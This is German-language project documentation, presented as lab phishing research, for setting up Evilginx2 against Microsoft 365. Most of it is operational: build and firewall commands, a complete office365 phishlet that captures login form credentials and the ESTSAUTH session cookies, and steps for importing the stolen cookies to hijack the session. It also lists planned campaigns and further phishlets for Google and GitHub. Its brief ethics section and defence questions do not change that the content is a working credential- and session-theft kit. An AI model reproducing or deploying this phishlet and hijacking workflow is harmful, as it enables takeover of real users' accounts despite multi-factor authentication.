# Phishing Awareness Forschungsprojekt - Technische Dokumentation

## Projekthintergrund und Zielsetzung

### Forschungsziel
Dieses Projekt dient der technischen Erforschung von Phishing-Technologien im kontrollierten Laboreinsatz. Der Fokus liegt auf dem Aufbau der technischen Infrastruktur und dem Verständnis moderner Angriffsmethoden.

### Aktueller Projektstatus
Phase 1: Technische Infrastruktur - Abgeschlossen  
Phase 2: Phishlet Entwicklung - Abgeschlossen  
Phase 3: Testing & Validierung - In Arbeit  
Phase 4: Kampagnen - Noch nicht begonnen  

## Technische Infrastruktur

### Server-Konfiguration
```bash
# Betriebssystem: Ubuntu Server 22.04 LTS
# Virtualisierung: Lokale VM / Cloud Instance
# Spezifikation: 2 vCPU, 4GB RAM, 50GB Storage

# Basis-Setup Commands:
sudo apt update && sudo apt upgrade -y
sudo apt install -y git make build-essential net-tools
```

### Netzwerk-Architektur
Lokale Testumgebung:
Domain: lab.test (lokale Entwicklung)
Subdomains:
  - login.lab.test
  - account.lab.test

## Evilginx Installation und Konfiguration

### Go Installation
```bash
# Go 1.21.0 installieren
wget https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz

# PATH Variable setzen
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc

# Installation verifizieren
go version
```

### Evilginx Build Process
```bash
# Repository klonen
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2

# Binary kompilieren
make

# Ersten Start durchführen
./evilginx
```

### Firewall Konfiguration
```bash
# UFW Firewall einrichten
sudo ufw enable
sudo ufw allow 22/tcp    # SSH
sudo ufw allow 80/tcp    # HTTP
sudo ufw allow 443/tcp   # HTTPS

# IPTables für Port Redirect
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443
```

## Phishlet Entwicklung - Microsoft 365

### Komplettes Phishlet: office365.yaml
```yaml
name: "office365"
author: "Research Team"
min_ver: "3.0"

proxy_hosts:
  - {phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: false}
  - {phish_sub: "account", orig_sub: "account", domain: "microsoftonline.com", session: true, is_landing: false}

sub_filters:
  - {hostname: "login.microsoftonline.com", sub: "login", domain: "microsoftonline.com", search: "login.microsoftonline.com", replace: "login.lab.test", mimes: ["text/html", "application/javascript", "text/css"]}
  - {hostname: "account.microsoftonline.com", sub: "account", domain: "microsoftonline.com", search: "account.microsoftonline.com", replace: "account.lab.test", mimes: ["text/html", "application/javascript", "text/css"]}

auth_tokens:
  - domain: ".login.microsoftonline.com"
    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"]

login:
  domain: "login.microsoftonline.com"
  path: "/common/oauth2/authorize"

credentials:
  username:
    key: "loginfmt"
    search: "name=\"loginfmt\""
    type: "form"
  password:
    key: "passwd" 
    search: "name=\"passwd\""
    type: "form"
```

### Phishlet Aktivierung
```bash
# Phishlet in Evilginx laden
./evilginx

# In Evilginx Console:
phishlets hostname office365 login.lab.test
phishlets enable office365

# Status überprüfen
phishlets list
```

## DNS Konfiguration für lokales Testing

### Hosts Datei Konfiguration
```bash
# Lokale /etc/hosts Einträge
echo "127.0.0.1 login.lab.test" | sudo tee -a /etc/hosts
echo "127.0.0.1 account.lab.test" | sudo tee -a /etc/hosts
```

## Technisches Testing und Validierung

### Manueller Testablauf
1. Lokalen Zugriff testen
   - Browser öffnen: https://login.lab.test
   - Evilginx leitet zu echtem Microsoft Login weiter

2. Session Capture testen
   - Mit Test-Account anmelden
   - Session Cookies werden von Evilginx erfasst

3. Cookie Export validieren
   - Struktur und Inhalte prüfen

## Session Hijacking Forschung

### Cookie Import Challenge
Technisches Problem: Browser Security Policies
```javascript
// Cross-Domain Cookie Setting nicht erlaubt
document.cookie = "ESTSAUTH=...; domain=.login.microsoftonline.com"
// Error: Failed to set cookie - Cross-domain setting not allowed
```

### Erfolgreicher Workaround
1. Browser Extension Methode
   - "Cookie-Editor" Extension installieren
   - Immer inkognito fenster nutzen und sich immer abmelden
  
2. Vorbereitungsschritte
   ```bash
   # Bestehende Cookies löschen
   # Browser Cache leeren
   # Von Accounts abmelden
   # Browser neustarten
   ```

3. Import-Prozess
   - Zu https://login.microsoftonline.com navigieren
   - Cookie-Editor öffnen
   - Cookies importieren
   - Seite neu laden


## Bisherige technische Erkenntnisse

### Evilginx Funktionalität
- Reverse Proxy funktioniert korrekt
- Domain-Filtering arbeitet wie erwartet
- Session Capture ist erfolgreich
- Cookie Export im JSON-Format funktioniert

### Microsoft Auth Flow Analyse
- ESTSAUTH: Primäres Session Token
- ESTSAUTHPERSISTENT: Persistentes Auth Token  
- SignInStateCookie: Login State Management
- Expiration: Standard 24-48 Stunden

### Technische Hürden
1. Cookie Import Restrictions
   - Same-Origin Policy des Browsers
   - HttpOnly Flags schützen vor XSS
   - Secure Flag erzwingt HTTPS

2. Session Validation
   - IP-basierte Sicherheitsmechanismen
   - Device Fingerprinting
   - Time-based Token Validation

## Sicherheitsmaßnahmen im Laboreinsatz

### Testumgebung Safeguards
```bash
# Isolierte Laborumgebung
# Keine Produktivdaten
```

### Ethische Richtlinien
- Nur eigene Test-Accounts
- Isolierte Laborumgebung
- Keine externen Teilnehmer
- Forschungszwecke ausschließlich

## Nächste Schritte im Projekt

### Phase 4: Zukünftige Entwicklung
- Weitere Phishlets entwickeln (Google, GitHub)
- Automatisierte Testing Pipeline
- Defense Techniques Entwicklung

### Technische Forschungsfragen
1. Wie können Session Cookies besser geschützt werden?
2. Wie kann Awareness training verbessert werden?

## Dokumentation der Testfälle

### Durchgeführte Tests
Testfall | Status | Ergebnis
---------|--------|----------
Evilginx Installation | Erfolg | System läuft stabil
Phishlet Entwicklung | Erfolg | Office365 Phishlet funktional
Local DNS Setup | Erfolg | Subdomain Routing korrekt
Session Capture | Erfolg | Cookies werden erfasst
Cookie Export | Erfolg | JSON Format korrekt
Cookie Import | Teilweise | Technische Limitationen

### Bekannte Limitationen
1. Lokale Testumgebung - Keine externen Zugriffe
2. Cookie Reuse - Eingeschränkt durch Browser Policies  
3. Scale - Derzeit nur Einzelnutzer-Testing

---

Projektstand: Technische Infrastruktur aufgebaut - Grundlagenforschung  
Letztes Update: $(date +%Y-%m-%d)  
Nächste Meilensteine: Erweiterte Session Analysis, Detektion Research

---

Diese Forschung dient ausschließlich dem technischen Verständnis von Phishing-Mechanismen und der Entwicklung verbesserter Schutzmaßnahmen. Alle Tests finden in vollständig isolierten Laborumgebungen statt.
